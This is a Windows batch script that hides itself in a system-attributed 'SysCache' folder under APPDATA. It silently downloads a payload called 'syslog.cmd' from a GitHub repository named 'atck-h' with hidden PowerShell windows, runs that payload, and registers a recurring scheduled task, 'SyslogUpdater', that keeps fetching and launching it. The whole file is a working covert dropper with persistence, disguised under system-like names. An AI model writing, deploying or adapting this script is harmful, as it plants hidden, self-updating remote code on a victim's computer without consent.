@echo off
setlocal enabledelayedexpansion

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"

if not exist "%BASE%" (
    mkdir "%BASE%"
    attrib +h +s "%BASE%"
)

:: Copy this updater to the base folder (if not already there)
:: Copy self only once (installation phase)
if not exist "%UPDATER%" (
    copy "%~f0" "%UPDATER%" >nul
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" goto RUN

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "%LOCAL%"=="%REMOTE%" (
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"
    )
)

:RUN
if exist "%PRANK%" start "" "%PRANK%"

:: --- Customizable interval ---
:: First argument = minutes (default 5). Supports hours/days by converting to minutes.
set "INTERVAL=5"
if not "%~1"=="" set "INTERVAL=%~1"

:: Convert common shorthand (e.g., 1h, 1d) to minutes
if /i "%INTERVAL:~-1%"=="h" set /a "INTERVAL=%INTERVAL:~0,-1% * 60"
if /i "%INTERVAL:~-1%"=="d" set /a "INTERVAL=%INTERVAL:~0,-1% * 1440"

:: Calculate start time = current time + INTERVAL minutes
for /f "tokens=*" %%a in ('
    powershell -Command "$t=(Get-Date).AddMinutes(%INTERVAL%); $t.ToString('HH:mm')"
') do set "START_TIME=%%a"

:: Delete existing task (if any) and create new one with chosen interval and delayed start
schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo %INTERVAL% /st %START_TIME% /f >nul 2>&1

endlocal
